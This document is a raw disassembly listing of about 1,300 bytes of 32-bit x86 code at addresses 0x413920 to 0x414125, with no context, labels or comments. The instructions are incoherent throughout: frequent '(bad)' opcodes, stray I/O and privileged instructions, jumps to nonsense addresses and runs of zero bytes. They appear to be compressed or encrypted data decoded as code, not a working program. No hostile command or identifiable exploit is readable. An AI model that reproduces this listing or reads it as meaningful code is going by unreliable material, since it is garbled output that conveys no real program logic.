  413920:	jp     0x41399a
  413922:	or     dh,bl
  413924:	pop    edi
  413925:	(bad)  
  413926:	push   ebp
  413927:	dec    DWORD PTR [ecx-0x73bff025]
  41392d:	sti    
  41392e:	sbb    al,cl
  413930:	rol    DWORD PTR [ecx+0x0],0x75
  413934:	gs dec esp
  413936:	sbb    eax,edx
  413938:	daa    
  413939:	inc    ecx
  41393a:	add    BYTE PTR [ecx+0x43c78741],cl
  413940:	dec    esp
  413941:	dec    esp
  413942:	sbb    esp,ecx
  413944:	add    DWORD PTR [ecx+0x0],eax
  413947:	(bad)  
  413948:	pop    ecx
  413949:	mov    ebx,ecx
  41394b:	inc    ebx
  41394c:	dec    esp
  41394d:	add    al,0x56
  41394f:	push   DWORD PTR [ebp-0x3a]
  413952:	in     eax,dx
  413953:	adc    DWORD PTR [ebp+0x459f2bd9],esi
  413959:	adc    al,0x3f
  41395b:	add    BYTE PTR [eax],al
  41395d:	add    BYTE PTR [eax],al
  41395f:	add    BYTE PTR [eax],al
  413961:	pop    esi
  413962:	sbb    al,0x55
  413964:	sub    BYTE PTR [ebp+0x754054f1],cl
  41396a:	sbb    ch,dh
  41396c:	push   ebx
  41396d:	addr16 cdq 
  41396f:	add    DWORD PTR [ecx],edi
  413971:	ss ins DWORD PTR es:[edi],dx
  413973:	mul    BYTE PTR [edi+0x61]
  413976:	addr16 inc ecx
  413978:	add    BYTE PTR [ebp-0x8],al
  41397b:	hlt    
  41397c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41397d:	xchg   DWORD PTR [ecx+0x13c5a101],ebx
  413983:	aas    
  413984:	add    BYTE PTR [esi-0x78fbaae4],bl
  41398a:	sbb    edi,edx
  41398c:	adc    edi,esi
  41398e:	or     al,0x28
  413990:	or     BYTE PTR [edi-0xf],cl
  413993:	retf   0x9174
  413996:	leave  
  413997:	xor    ch,bh
  413999:	fs mov eax,0xe3cdf5b1
  41399f:	shl    ebp,0xbd
  4139a2:	and    eax,edx
  4139a4:	or     BYTE PTR [ebp-0x1a],dh
  4139a7:	jbe    0x413995
  4139a9:	test   BYTE PTR [ebp+ebx*1+0x4e542256],0x10
  4139b1:	out    dx,al
  4139b2:	push   0xf601fd86
  4139b7:	fistp  DWORD PTR [edi+0xe]
  4139ba:	fild   DWORD PTR [ecx]
  4139bc:	cmp    al,0x71
  4139be:	leave  
  4139bf:	sub    eax,0x316fb88b
  4139c4:	push   esi
  4139c5:	add    BYTE PTR [eax],al
  4139c7:	add    BYTE PTR [eax],al
  4139c9:	add    BYTE PTR [ebp-0x6a],cl
  4139cc:	retf   
  4139cd:	std    
  4139ce:	push   edx
  4139cf:	pusha  
  4139d0:	shl    DWORD PTR [ebx+0x71],0x2
  4139d4:	sbb    esp,eax
  4139d6:	dec    esp
  4139d7:	dec    edx
  4139d8:	push   0x4e
  4139da:	ins    DWORD PTR es:[edi],dx
  4139db:	add    ah,BYTE PTR [edx+0x16]
  4139de:	shr    esp,0xa6
  4139e1:	add    ebx,DWORD PTR [edi+0x6e57a5fa]
  4139e7:	sub    eax,0x3341466c
  4139ec:	ss push esi
  4139ee:	jge    0x4139b5
  4139f0:	adc    eax,0x69f73180
  4139f5:	dec    esi
  4139f6:	jno    0x4139fa
  4139f8:	xchg   ebx,eax
  4139f9:	(bad)  
  4139fa:	mov    eax,ds:0x45afac77
  4139ff:	lds    edx,FWORD PTR [edi+edi*8-0x38955317]
  413a06:	jno    0x413a87
  413a08:	and    dl,BYTE PTR [edi+0x6c]
  413a0b:	sub    eax,0x32d94664
  413a10:	call   0x29f8:0xab81a3cc
  413a17:	ja     0x413a3d
  413a19:	fsub   DWORD PTR ds:0xb1f45cc5
  413a1f:	lods   al,BYTE PTR ds:[esi]
  413a20:	ret    0xf618
  413a23:	test   eax,0x3f70c372
  413a28:	stos   BYTE PTR es:[edi],al
  413a29:	xor    al,0x98
  413a2b:	dec    edi
  413a2c:	jecxz  0x4139f8
  413a2e:	add    BYTE PTR [eax],al
  413a30:	add    BYTE PTR [eax],al
  413a32:	add    BYTE PTR [esi],al
  413a34:	cli    
  413a35:	lods   eax,DWORD PTR ds:[esi]
  413a36:	adc    cl,BYTE PTR [eax+0x42f5d6ef]
  413a3c:	add    ah,BYTE PTR [esp+eax*8+0x1]
  413a40:	push   0x6c
  413a42:	retf   
  413a43:	jmp    0xe1f09e3b
  413a48:	not    DWORD PTR [eax]
  413a4a:	cld    
  413a4b:	lds    ebp,FWORD PTR ds:0xecaef17e
  413a51:	jmp    FWORD PTR [eax]
  413a53:	jns    0x4139d8
  413a55:	(bad)  
  413a56:	fucom  st(6)
  413a58:	les    ebx,FWORD PTR [esi-0x39]
  413a5b:	add    eax,eax
  413a5d:	or     al,0xe9
  413a5f:	test   DWORD PTR [ebx-0x14],edi
  413a62:	mov    eax,0xe173c76b
  413a67:	aas    
  413a68:	icebp  
  413a69:	inc    edi
  413a6a:	(bad)  [esi+0x2e418102]
  413a70:	dec    esi
  413a71:	dec    esp
  413a72:	push   0x4c
  413a74:	(bad)  
  413a75:	std    
  413a76:	push   0x11
  413a78:	repnz mov esi,0x6a350409
  413a7e:	jmp    0x276:0xe967ff98
  413a85:	or     BYTE PTR [esi],0x44
  413a88:	cli    
  413a89:	mov    ch,BYTE PTR [edx+edi*4-0x50020e27]
  413a90:	mov    BYTE PTR [ecx+ebp*1-0x16961adb],0x0
  413a98:	add    BYTE PTR [eax],al
  413a9a:	add    BYTE PTR [eax],al
  413a9c:	sub    BYTE PTR [edx],al
  413a9e:	std    
  413a9f:	pop    esp
  413aa0:	mov    ebp,0x356cd911
  413aa5:	(bad)  
  413aa6:	call   0xfe07fa90
  413aab:	gs mov dh,0x4d
  413aae:	or     al,0x74
  413ab0:	xor    eax,0xb27ee8c6
  413ab5:	(bad)  
  413ab6:	std    
  413ab7:	jns    0x413b32
  413ab9:	fisttp DWORD PTR [edx]
  413abb:	pop    esp
  413abc:	xor    eax,0xba5ae8c6
  413ac1:	(bad)  
  413ac2:	std    
  413ac3:	(bad)  [esi+0x6eabc72a]
  413ac9:	les    edx,FWORD PTR [edx+eiz*2+0x42]
  413acd:	and    ah,0x0
  413ad0:	hlt    
  413ad1:	jl     0x413abf
  413ad3:	sub    al,0xcf
  413ad5:	cmp    dl,BYTE PTR [eax+eax*1]
  413ad8:	jb     0x413b0c
  413ada:	jne    0x413ac4
  413adc:	imul   edx,DWORD PTR [ebp+edi*8-0x1],0xffffff98
  413ae1:	add    dh,BYTE PTR [edx+0x70]
  413ae4:	leave  
  413ae5:	add    esp,DWORD PTR [eax+ecx*1]
  413ae8:	in     al,dx
  413ae9:	or     al,0xe8
  413aeb:	mov    bl,0xb9
  413aed:	mov    eax,0x334c84fb
  413af2:	js     0x413a77
  413af4:	fld    st(7)
  413af6:	std    
  413af7:	mov    dl,BYTE PTR [ecx]
  413af9:	or     al,0x16
  413afb:	inc    eax
  413afc:	sbb    al,0x34
  413afe:	or     ebp,DWORD PTR [edx+0x0]
  413b01:	add    BYTE PTR [eax],al
  413b03:	add    BYTE PTR [eax],al
  413b05:	add    al,0xb9
  413b07:	jno    0x413b11
  413b09:	mov    DWORD PTR [ebx],eax
  413b0b:	and    al,0x10
  413b0d:	sub    al,0xb9
  413b0f:	(bad)  
  413b10:	adc    DWORD PTR [eax-0x17827f35],0xffffffff
  413b17:	jae    0x413b28
  413b19:	push   es
  413b1a:	enter  0x75fc,0xd8
  413b1e:	dec    edx
  413b1f:	inc    esp
  413b20:	and    al,0xa4
  413b22:	psubq  mm2,mm6
  413b25:	dec    edi
  413b26:	ret    0x830c
  413b29:	sbb    esi,ecx
  413b2b:	std    
  413b2c:	jae    0x413ac9
  413b2e:	and    eax,0xce41ff08
  413b33:	mov    al,BYTE PTR [eax+esi*2+0x1e]
  413b37:	push   eax
  413b38:	inc    DWORD PTR [edx]
  413b3a:	jle    0x413b00
  413b3c:	or     al,0x36
  413b3e:	(bad)  
  413b3f:	cld    
  413b40:	jne    0x413ae2
  413b42:	dec    esp
  413b43:	inc    esp
  413b44:	and    al,0xa4
  413b46:	psubq  mm2,mm6
  413b49:	cmpps  xmm1,XMMWORD PTR [ecx*4+0x8201575],0xc5
  413b52:	or     ah,bl
  413b54:	fldenv [eax+0x7c]
  413b57:	(bad)  
  413b58:	jmp    0x108e7fdf
  413b5d:	push   edx
  413b5e:	(bad)  
  413b5f:	cmc    
  413b60:	cld    
  413b61:	shl    cl,0xc8
  413b64:	xor    DWORD PTR [edx-0x3a],eax
  413b67:	xor    DWORD PTR [edx],edx
  413b69:	add    BYTE PTR [eax],al
  413b6b:	add    BYTE PTR [eax],al
  413b6d:	add    BYTE PTR [ebp-0x71272f27],dh
  413b73:	sbb    edi,ecx
  413b75:	fmul   st,st(3)
  413b77:	pusha  
  413b78:	fstp   QWORD PTR [ebx+0x37]
  413b7b:	test   eax,0xd8f56801
  413b80:	add    DWORD PTR [eax],eax
  413b82:	adc    al,BYTE PTR [ebp-0x51f5f7e3]
  413b88:	sbb    eax,0xc8d9b512
  413b8d:	je     0x413be0
  413b8f:	(bad)  
  413b91:	adc    esp,DWORD PTR [ecx-0x1dffbe39]
  413b97:	adc    bl,ch
  413b99:	mov    edi,0x4c620ea
  413b9e:	jne    0x413c0e
  413ba0:	jl     0x413b8e
  413ba2:	idiv   ah
  413ba4:	out    dx,eax
  413ba5:	cmp    BYTE PTR [eax],0xd5
  413ba8:	enter  0x2b51,0x31
  413bac:	test   BYTE PTR [eax],al
  413bae:	jne    0x413b89
  413bb0:	pop    ebx
  413bb1:	add    DWORD PTR [edi],ebx
  413bb3:	fcomp  DWORD PTR [ecx+0x0]
  413bb6:	jne    0x413b91
  413bb8:	cmp    ebp,0x4376d128
  413bbe:	cdq    
  413bbf:	mov    al,0xb2
  413bc1:	stc    
  413bc2:	xchg   edx,eax
  413bc3:	mov    edi,DWORD PTR [ebp-0x40]
  413bc6:	add    DWORD PTR [ecx],edi
  413bc8:	jne    0x413c0d
  413bca:	add    DWORD PTR [ecx],0xd2067737
  413bd0:	(bad)  
  413bd1:	and    al,BYTE PTR [eax]
  413bd3:	add    BYTE PTR [eax],al
  413bd5:	add    BYTE PTR [eax],al
  413bd7:	jno    0x413b9b
  413bd9:	xchg   esi,eax
  413bda:	jg     0x413c11
  413bdc:	aaa    
  413bdd:	aaa    
  413bde:	adc    eax,0xd023fc3c
  413be3:	loopne 0x413c30
  413be5:	jb     0x413c35
  413be7:	inc    ebp
  413be8:	xor    eax,0x34b82e4
  413bed:	out    0xa3,eax
  413bef:	jne    0x413c2a
  413bf1:	and    ecx,DWORD PTR [ebx]
  413bf3:	sahf   
  413bf4:	mov    dh,0xd6
  413bf6:	jmp    FWORD PTR [ebp-0x4b]
  413bf9:	fld    QWORD PTR [ebx+eax*8-0x56]
  413bfd:	ds sub eax,0x70c222
  413c03:	pop    esp
  413c04:	lds    esi,FWORD PTR [ebx-0x5b705be0]
  413c0a:	sti    
  413c0b:	mov    ebx,0x86c89758
  413c10:	mov    esi,0x14b6ee26
  413c15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c16:	add    esi,esi
  413c18:	ret    0xf79b
  413c1b:	std    
  413c1c:	inc    edi
  413c1d:	fisttp WORD PTR [ebx+edi*4]
  413c20:	aaa    
  413c21:	in     al,dx
  413c22:	jp     0x413c54
  413c24:	push   es
  413c25:	adc    ah,bh
  413c27:	sar    ecx,1
  413c29:	(bad)  
  413c2a:	in     al,0x2f
  413c2c:	add    esp,edi
  413c2e:	jbe    0x413c66
  413c30:	mov    esi,0xc1bc32cf
  413c35:	ficom  WORD PTR [edx]
  413c37:	mov    ch,0x60
  413c39:	xor    bh,BYTE PTR [ebp+0x0]
  413c3f:	add    BYTE PTR [edi-0x7f8318fa],dh
  413c45:	mov    esp,DWORD PTR [esi]
  413c47:	add    dh,ch
  413c49:	inc    edi
  413c4a:	mov    ebx,0xbd4edc
  413c4f:	mov    dh,0xb2
  413c51:	jb     0x413c52
  413c53:	shl    DWORD PTR [eax+0x46958955],0x8b
  413c5a:	pop    ebx
  413c5b:	icebp  
  413c5c:	ja     0x413cbb
  413c5e:	adc    BYTE PTR [edx+0x2a],ah
  413c61:	mov    edx,ecx
  413c63:	or     DWORD PTR [ebx-0x2516fffe],0x67e573c2
  413c6d:	ret    0xc8e9
  413c70:	cwde   
  413c71:	mov    edi,0xf7bfd973
  413c76:	add    ah,bl
  413c78:	ds mov esi,0xbf60ed73
  413c7e:	adc    esp,DWORD PTR [ebp+0x6a000118]
  413c84:	xor    eax,0x1aa6390e
  413c89:	aaa    
  413c8a:	add    DWORD PTR [eax+0x5a],esi
  413c8d:	push   es
  413c8e:	mov    DWORD PTR [edi],ebp
  413c90:	push   ebx
  413c91:	pop    ebx
  413c92:	pop    ebx
  413c93:	sub    edi,ebp
  413c95:	rcl    BYTE PTR [ebx+0x72],0x21
  413c99:	push   edi
  413c9a:	cmp    DWORD PTR [edi+0x622136ee],esi
  413ca0:	mov    ds:0xa88b0e,eax
  413ca5:	add    BYTE PTR [eax],al
  413ca7:	add    BYTE PTR [eax],al
  413ca9:	mov    ebx,0xdc7dc284
  413cae:	mov    ch,0xd0
  413cb0:	retf   0x2b4
  413cb3:	mov    edi,0x2aab962
  413cb8:	bound  ebp,QWORD PTR [edi-0x763817aa]
  413cbe:	sar    ebp,0x65
  413cc1:	mov    dh,0x35
  413cc3:	add    esp,DWORD PTR [eax+0x30]
  413cc6:	or     dh,BYTE PTR [eax-0x3e9fa418]
  413ccc:	add    BYTE PTR [edx-0xf],bh
  413ccf:	xchg   al,bh
  413cd1:	sbb    eax,ecx
  413cd3:	jno    0x413cdd
  413cd5:	sbb    DWORD PTR [esp+esi*2+0x3a],ebp
  413cd9:	ins    DWORD PTR es:[edi],dx
  413cda:	add    eax,0x6c0936e7
  413cdf:	je     0x413d17
  413ce1:	loope  0x413ce3
  413ce3:	add    al,BYTE PTR [ebp-0x17d4afe4]
  413ce9:	lock out dx,al
  413ceb:	cld    
  413cec:	jmp    edi
  413cee:	rol    DWORD PTR [ecx+0x682048f6],cl
  413cf4:	xor    BYTE PTR [ecx+0x4],cl
  413cf7:	add    BYTE PTR [edi-0x29],dl
  413cfa:	inc    edi
  413cfb:	and    al,0x14
  413cfd:	cli    
  413cfe:	fstp   TBYTE PTR [edi-0x7b372c15]
  413d04:	ror    BYTE PTR [ecx-0x46],0x53
  413d08:	call   0x3e2750
  413d0d:	add    BYTE PTR [eax],al
  413d0f:	add    BYTE PTR [eax],al
  413d11:	add    BYTE PTR [esi],bl
  413d13:	(bad)  
  413d14:	out    0x20,eax
  413d16:	test   DWORD PTR [eax+esi*4],edx
  413d19:	add    DWORD PTR [edi-0x36cf9a57],esi
  413d1f:	add    eax,DWORD PTR [eax]
  413d21:	push   edi
  413d22:	push   ebx
  413d23:	dec    edi
  413d24:	and    al,0x14
  413d26:	test   BYTE PTR ds:0x8283ffec,dl
  413d2c:	xlat   BYTE PTR ds:[ebx]
  413d2d:	mov    dl,BYTE PTR [eax+edi*4+0x7b72c092]
  413d34:	and    al,cl
  413d36:	repz in eax,0xc1
  413d39:	add    al,0xdc
  413d3b:	repnz xchg ah,ch
  413d3e:	dec    edi
  413d3f:	xlat   BYTE PTR ds:[ebx]
  413d40:	sbb    BYTE PTR [ebx+0x65fdba51],al
  413d46:	and    eax,0x7588ea4f
  413d4b:	out    dx,al
  413d4c:	xlat   BYTE PTR ds:[ebx]
  413d4d:	jae    0x413dbe
  413d4f:	inc    ebx
  413d50:	std    
  413d51:	push   edi
  413d52:	adc    esi,DWORD PTR [edx]
  413d54:	cmp    eax,0xebd425e8
  413d59:	imul   esp,DWORD PTR [eax+0x11],0xf682105a
  413d60:	mul    DWORD PTR [ebp-0x14]
  413d63:	out    dx,al
  413d64:	fisttp DWORD PTR [ebx-0x17cb7148]
  413d6a:	repnz add BYTE PTR gs:[eax],al
  413d6e:	iret   
  413d6f:	mov    dh,0x76
  413d71:	inc    ebx
  413d72:	dec    ebp
  413d73:	sbb    ebx,eax
  413d75:	jae    0x413d77
  413d77:	add    BYTE PTR [eax],al
  413d79:	add    BYTE PTR [eax],al
  413d7b:	jge    0x413d0e
  413d7d:	imul   bl
  413d7f:	dec    edx
  413d80:	cmp    BYTE PTR [eax+0x5bcec9c0],al
  413d86:	add    DWORD PTR [ebx-0x23],0xfffffff0
  413d8a:	or     al,0xea
  413d8c:	out    0x33,al
  413d8e:	std    
  413d8f:	mov    al,ds:0x6d73c4b9
  413d94:	inc    ecx
  413d95:	into   
  413d96:	jmp    0xc0c185b5
  413d9b:	mov    DWORD PTR [esi+0x44b5c010],esp
  413da1:	add    dh,BYTE PTR [ecx]
  413da3:	xor    eax,0x750cc1e2
  413da8:	pop    ecx
  413da9:	add    edx,eax
  413dab:	sub    DWORD PTR [ecx-0x5a6ebb88],0xa1994c78
  413db5:	sub    ecx,DWORD PTR [ecx-0x306329f]
  413dbb:	mov    ebp,DWORD PTR [esp+eax*8]
  413dbe:	or     eax,0xdc12c25
  413dc3:	int    0x69
  413dc5:	cmp    bh,0xba
  413dc8:	add    DWORD PTR [edi+0x45],esp
  413dcb:	jns    0x413dcf
  413dcd:	cmp    eax,0xafb7774f
  413dd2:	rol    BYTE PTR [esi-0x75],0xbb
  413dd6:	xor    ch,BYTE PTR [edx]
  413dd8:	mov    DWORD PTR [esp+ecx*8],ebp
  413ddb:	inc    BYTE PTR [edi+edi*4+0x33]
  413ddf:	add    BYTE PTR [eax],al
  413de1:	add    BYTE PTR [eax],al
  413de3:	add    BYTE PTR ds:0x75430e3d,bl
  413de9:	sub    dl,BYTE PTR [edx-0x59fd8afe]
  413def:	dec    esi
  413df0:	add    esp,0xbd6ac824
  413df6:	sbb    al,0xfc
  413df8:	pop    edx
  413df9:	int3   
  413dfa:	sub    DWORD PTR [edx],eax
  413dfc:	jne    0x413d7f
  413dfe:	stos   DWORD PTR es:[edi],eax
  413dff:	out    dx,eax
  413e00:	cmp    eax,ecx
  413e02:	out    dx,eax
  413e03:	add    ebx,edi
  413e05:	push   ss
  413e06:	pusha  
  413e07:	std    
  413e08:	out    dx,eax
  413e09:	inc    esp
  413e0a:	jecxz  0x413e65
  413e0c:	jne    0x413e60
  413e0e:	data16 out dx,al
  413e10:	ret    0xa714
  413e13:	add    esi,esp
  413e15:	(bad)  
  413e16:	jecxz  0x413e8e
  413e18:	mov    ebx,0x86c4b71a
  413e1d:	loop   0x413df7
  413e1f:	inc    ebx
  413e20:	jne    0x413dab
  413e22:	and    eax,0x4389a6c0
  413e27:	js     0x413ddf
  413e29:	push   cs
  413e2a:	push   0xffffffd7
  413e2c:	pop    ebp
  413e2d:	push   ecx
  413e2e:	push   0xffffffc3
  413e30:	lds    edx,FWORD PTR [esi+esi*4+0x6]
  413e34:	adc    eax,0x7003e704
  413e39:	test   DWORD PTR [ecx],ecx
  413e3b:	add    esi,DWORD PTR [ebp+0x2]
  413e3e:	jb     0x413e7e
  413e40:	jge    0x413dc3
  413e42:	daa    
  413e43:	call   FWORD PTR [esi+edx*1+0x0]
  413e47:	cdq    
  413e48:	add    BYTE PTR [eax],al
  413e4a:	add    BYTE PTR [eax],al
  413e4c:	add    BYTE PTR [edi],bh
  413e4e:	inc    ecx
  413e4f:	hlt    
  413e50:	add    esi,ebp
  413e52:	cmp    eax,0xbf46e8ff
  413e57:	adc    eax,DWORD PTR [ecx-0x71]
  413e5a:	inc    edx
  413e5b:	add    BYTE PTR [edx-0x53],ch
  413e5e:	push   cs
  413e5f:	sub    DWORD PTR [ecx-0x1642797a],0x76
  413e66:	add    ch,al
  413e68:	jge    0x413e55
  413e6a:	mov    ebp,0xba2c60fd
  413e6f:	mov    esp,DWORD PTR [eax*8+0x39f5f3]
  413e76:	xor    eax,esi
  413e78:	xchg   ecx,eax
  413e79:	cmp    al,0x8f
  413e7b:	std    
  413e7c:	xchg   esi,eax
  413e7d:	lock inc eax
  413e7f:	cld    
  413e80:	shr    BYTE PTR [ecx+esi*1],cl
  413e83:	add    al,0xba
  413e85:	aaa    
  413e86:	stos   DWORD PTR es:[edi],eax
  413e87:	je     0x413efb
  413e89:	mov    ah,0xae
  413e8b:	xor    DWORD PTR [esi+0x73],0x6b030130
  413e92:	pop    edi
  413e93:	cmp    DWORD PTR [edi+0x6f],esp
  413e96:	in     al,dx
  413e97:	mov    al,cl
  413e99:	xchg   DWORD PTR [eax],ebp
  413e9b:	adc    al,0x56
  413e9d:	pop    esp
  413e9e:	mov    dh,0x51
  413ea0:	dec    esi
  413ea1:	jl     0x413efd
  413ea3:	push   ss
  413ea4:	test   eax,0xedc48376
  413ea9:	std    
  413eaa:	shl    DWORD PTR [esp+eiz*8-0x54],0x3d
  413eaf:	rcl    DWORD PTR [edx],0x0
  413eb2:	add    BYTE PTR [eax],al
  413eb4:	add    BYTE PTR [eax],al
  413eb6:	jo     0x413eba
  413eb8:	add    dl,ah
  413eba:	das    
  413ebb:	xor    dl,ah
  413ebd:	adc    bh,BYTE PTR [edx+0x25]
  413ec0:	div    BYTE PTR [edx]
  413ec2:	js     0x413ec6
  413ec4:	add    dl,ch
  413ec6:	popf   
  413ec7:	mov    esi,0xb44d0073
  413ecc:	iret   
  413ecd:	test   ebx,ecx
  413ecf:	hlt    
  413ed0:	sub    al,0x8b
  413ed2:	adc    DWORD PTR [ebp+0x7f],edi
  413ed5:	rcl    al,0x80
  413ed8:	js     0x413ede
  413eda:	lahf   
  413edb:	xchg   ecx,eax
  413edc:	jo     0x413eda
  413ede:	inc    ebx
  413edf:	and    al,BYTE PTR [edi+0x74ce1108]
  413ee5:	adc    al,BYTE PTR [ebp-0x768907ad]
  413eeb:	mov    ebx,DWORD PTR [ecx-0x8]
  413eee:	fistp  QWORD PTR [di-0x5]
  413ef2:	or     al,0x92
  413ef4:	push   edi
  413ef5:	add    BYTE PTR [edi],bh
  413ef7:	dec    edx
  413ef8:	inc    edx
  413ef9:	add    eax,0x737
  413efe:	push   edi
  413eff:	fnstenv [edx-0x2b]
  413f02:	xlat   BYTE PTR ds:[ebx]
  413f03:	mov    al,ds:0x727db65
  413f08:	add    BYTE PTR [eax],al
  413f0a:	leave  
  413f0b:	mov    edi,ss
  413f0d:	add    DWORD PTR [eax+eax*1-0x77],ebx
  413f11:	jne    0x413edb
  413f13:	addr16 pop ebx
  413f15:	push   edi
  413f16:	dec    ebp
  413f17:	add    BYTE PTR [eax+eax*8+0x0],al
  413f1e:	add    BYTE PTR [ecx+0x1f],dl
  413f21:	sti    
  413f22:	jne    0x413eec
  413f24:	adc    DWORD PTR [bx+si+0xd],ebx
  413f28:	add    BYTE PTR [ecx-0x6598438b],cl
  413f2e:	xchg   DWORD PTR [ebx-0x143fcd40],edi
  413f34:	and    DWORD PTR [edi-0x37],edx
  413f37:	dec    esi
  413f38:	or     eax,DWORD PTR [eax]
  413f3a:	mov    edx,ecx
  413f3c:	jnp    0x413ec7
  413f3e:	xor    al,0xdf
  413f40:	dec    eax
  413f41:	push   0xffffdddb
  413f46:	imul   esi,DWORD PTR [ebp-0x57],0x7980fd57
  413f4d:	pop    ss
  413f4e:	inc    eax
  413f4f:	jne    0x413f05
  413f51:	ja     0x413f96
  413f53:	gs sub ch,al
  413f56:	or     al,0xca
  413f58:	adc    DWORD PTR [esi],ebx
  413f5a:	rcl    BYTE PTR [esi+0x3bc6b966],0xb1
  413f61:	add    DWORD PTR [edi+0x438ca533],eax
  413f67:	jno    0x413f62
  413f69:	mov    esi,0x89436d73
  413f6e:	inc    esi
  413f6f:	jl     0x413f99
  413f71:	retf   0x2309
  413f74:	jl     0x413f8b
  413f76:	dec    esp
  413f77:	imul   ebp,ecx,0x3
  413f7a:	xor    DWORD PTR [ecx+0x74fd84dd],0xe7fd1b
  413f84:	add    BYTE PTR [eax],al
  413f86:	add    BYTE PTR [eax],al
  413f88:	pop    es
  413f89:	sub    DWORD PTR [ecx],eax
  413f8b:	add    dh,ch
  413f8d:	sbb    eax,0x81c355c0
  413f92:	pop    ecx
  413f93:	(bad)  
  413f94:	push   edx
  413f95:	test   BYTE PTR [ebx-0x154c8003],al
  413f9b:	inc    dx
  413f9d:	nop
  413f9e:	add    DWORD PTR [eax],eax
  413fa0:	jne    0x413fa1
  413fa2:	pop    ss
  413fa3:	std    
  413fa4:	test   al,0x5d
  413fa6:	lea    eax,[edx+eiz*2+0x22fdc215]
  413fad:	jns    0x413f6f
  413faf:	adc    edi,DWORD PTR [ebp-0x9ffbe4d]
  413fb5:	in     al,dx
  413fb6:	jae    0xc1d7ebf1
  413fbc:	(bad)  
  413fbd:	lahf   
  413fbe:	pusha  
  413fbf:	cmp    dh,0xa9
  413fc2:	ss or  al,0xf2
  413fc5:	add    DWORD PTR [edi+edi*4-0x30f03d04],ebx
  413fcc:	repz mov edx,0xbabd8e16
  413fd2:	xchg   esp,eax
  413fd3:	mov    edi,0x29e2ddd
  413fd8:	jne    0x413f67
  413fda:	je     0x413f8f
  413fdc:	int    0xb0
  413fde:	ins    DWORD PTR es:[edi],dx
  413fdf:	sar    DWORD PTR [eax+0x47ab2a87],0xbb
  413fe6:	out    0xc0,al
  413fe8:	inc    esi
  413fe9:	xchg   ebx,ecx
  413feb:	test   BYTE PTR [eax],al
  413fed:	add    BYTE PTR [eax],al
  413fef:	add    BYTE PTR [eax],al
  413ff1:	xchg   ecx,eax
  413ff2:	adc    DWORD PTR [edx],edi
  413ff4:	pop    edx
  413ff5:	inc    eax
  413ff6:	lea    esp,[eax+eax*8]
  413ff9:	and    eax,0x889221aa
  413ffe:	mov    edx,0x3cfabb72
  414003:	mov    ebx,0xe3347886
  414008:	cmc    
  414009:	xor    ch,BYTE PTR [esi-0x491972ef]
  41400f:	jb     0x414057
  414011:	test   DWORD PTR [eax+0x3e],edx
  414014:	lods   al,BYTE PTR ds:[esi]
  414015:	cmp    DWORD PTR [eax-0x470b3f72],edi
  41401b:	jmp    0x414052
  41401d:	je     0x41404b
  41401f:	jecxz  0x414082
  414021:	cmp    eax,DWORD PTR [eax-0x26]
  414024:	add    esi,esi
  414026:	mov    al,0xf3
  414028:	inc    edi
  414029:	inc    BYTE PTR [ecx-0xe]
  41402c:	mov    dh,BYTE PTR [esi+0x213670ba]
  414032:	or     bl,BYTE PTR [esi-0x63728db8]
  414038:	shld   DWORD PTR [ecx+0x29fbbbc],edi,cl
  41403f:	ror    DWORD PTR [ecx],1
  414041:	or     eax,0x777b0094
  414046:	add    cl,BYTE PTR [ecx+0x74b0fb39]
  41404c:	add    eax,0x720845f8
  414051:	fimul  WORD PTR [edx+0x1de]
  414057:	add    BYTE PTR [eax],al
  414059:	add    BYTE PTR [ebx-0x516ff8b],ch
  41405f:	ret    0xed74
  414062:	mov    esp,0xee81145
  414067:	cmp    al,0x68
  414069:	jmp    0xf5bccbe4
  41406e:	repnz dec ebp
  414070:	cld    
  414071:	pop    esp
  414072:	mov    esp,0x4bb6e84f
  414077:	mov    ecx,0x132c63fd
  41407c:	pop    ebp
  41407d:	das    
  41407e:	cs rol edx,0xf5
  414082:	jbe    0x4140d9
  414084:	mov    ebp,ecx
  414086:	sub    BYTE PTR [ecx+0x51],cl
  414089:	bound  ebx,QWORD PTR [edi]
  41408b:	adc    dl,BYTE PTR [esi+0x62]
  41408e:	es scas eax,DWORD PTR es:[edi]
  414090:	fiadd  WORD PTR [edx]
  414092:	and    ecx,DWORD PTR [ebp-0x56a808be]
  414098:	adc    BYTE PTR [edi],0x76
  41409b:	hlt    
  41409c:	push   esp
  41409d:	bound  edi,QWORD PTR [edi]
  41409f:	pop    es
  4140a0:	xchg   esp,eax
  4140a1:	sub    al,0x9
  4140a3:	stos   BYTE PTR es:[edi],al
  4140a4:	out    0x1d,al
  4140a6:	js     0x4140aa
  4140a8:	pushw  0xfff9
  4140ab:	icebp  
  4140ac:	jo     0x414093
  4140ae:	and    al,0x79
  4140b0:	jmp    0x741c3e99
  4140b5:	in     al,0x19
  4140b7:	pop    esp
  4140b8:	cld    
  4140b9:	inc    edx
  4140ba:	jae    0x41403f
  4140bc:	sar    ebp,0x0
  4140bf:	add    BYTE PTR [eax],al
  4140c1:	add    BYTE PTR [eax],al
  4140c3:	add    DWORD PTR [ebp-0x4],ebx
  4140c6:	add    BYTE PTR [edi-0x1f391734],al
  4140cc:	std    
  4140cd:	(bad)  
  4140ce:	(bad)  
  4140cf:	mov    ecx,0xa4b70b78
  4140d4:	(bad)  
  4140d5:	ret    
  4140d6:	call   0x3f0584
  4140db:	pop    ecx
  4140dc:	mov    esi,0x434cd57e
  4140e1:	clc    
  4140e2:	add    ecx,ebp
  4140e4:	sbb    al,0x87
  4140e6:	inc    ebp
  4140e7:	les    ecx,FWORD PTR [ebx-0x6dab7500]
  4140ed:	std    
  4140ee:	dec    esp
  4140f0:	dec    edi
  4140f1:	sti    
  4140f2:	jne    0x414094
  4140f4:	ins    BYTE PTR es:[edi],dx
  4140f5:	mov    eax,0x84049c7e
  4140fa:	ror    BYTE PTR [eax+0x31],0xfb
  4140fe:	jne    0x4140c4
  414100:	dec    edi
  414101:	sti    
  414102:	jne    0x4140c4
  414104:	ins    BYTE PTR es:[edi],dx
  414105:	inc    esp
  414106:	std    
  414107:	mov    bl,0x77
  414109:	cmp    BYTE PTR [ebp-0x4c],0xfd
  41410d:	jo     0x414133
  41410f:	push   ss
  414110:	aas    
  414111:	std    
  414112:	sbb    DWORD PTR [eax+esi*8],0x18
  414116:	push   edi
  414117:	adc    edi,ebx
  414119:	sti    
  41411a:	(bad)  
  41411b:	and    al,0x9
  41411d:	mov    dh,0xc0
  41411f:	pushf  
  414120:	xchg   ecx,eax
  414121:	inc    esi
  414122:	add    al,0x8c
  414124:	pop    es
  414125:	mov    dh,0x46
